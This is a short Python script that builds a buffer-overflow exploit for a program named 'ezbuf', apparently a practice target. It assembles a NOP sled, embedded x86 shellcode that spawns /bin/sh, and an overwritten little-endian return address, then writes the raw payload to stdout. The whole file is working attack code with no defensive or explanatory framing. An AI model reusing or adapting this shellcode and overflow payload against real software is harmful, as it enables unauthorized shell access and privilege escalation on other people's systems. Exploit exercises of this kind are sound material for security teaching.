import os
import sys
import struct

# White-space free shell code.
# Thanks to: http://www.josho.org/blog/blog/2013/03/12/shellcode-whitespace/
SHELL_CODE = b"\x31\xc0\xb0\x30" \
            b"\x01\xc4\x30\xc0" \
            b"\x50\x68\x2f\x2f" \
            b"\x73\x68\x68\x2f" \
            b"\x62\x69\x6e\x89" \
            b"\xe3\x89\xc1\xb0" \
            b"\xb0\xc0\xe8\x04" \
            b"\xcd\x80\xc0\xe8" \
            b"\x03\xcd\x80"

# Write an exploit for ezbuf to stdout.
# See README for usage.
# Caveat: Doesn't handle whitespace characters in the address (workaround: run multiple times).
def exploit(addr):
    # Encode the address as little-endian bytes.
    rev_addr = struct.pack("<I", int(addr, 16))
    print("rev_addr:", rev_addr, file=sys.stderr, flush=True)

    # Construct the exploit.
    exploit = b"\x90" * (9447 - len(SHELL_CODE))
    exploit += SHELL_CODE

    assert (len(exploit) == 9447)

    exploit += rev_addr
    exploit += b"\n"

    # Write the exploit (taking care not to munge the nice bytes).
    os.write(1, exploit)
